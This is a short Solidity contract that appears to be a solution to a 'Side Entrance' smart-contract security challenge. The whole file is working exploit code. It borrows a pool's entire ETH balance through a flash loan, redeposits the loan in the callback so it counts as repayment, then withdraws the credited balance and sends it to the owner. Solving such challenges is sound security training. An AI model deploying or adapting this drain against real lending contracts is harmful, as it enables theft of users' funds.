// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";
import "solady/src/utils/SafeTransferLib.sol";

contract SideEntranceExploiter is IFlashLoanEtherReceiver {

    SideEntranceLenderPool public immutable pool;
    address payable owner;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
        owner = payable(msg.sender);
    }

    function exploit() external {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        SafeTransferLib.safeTransferETH(owner, address(this).balance);
    }

    function execute() external payable override {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}
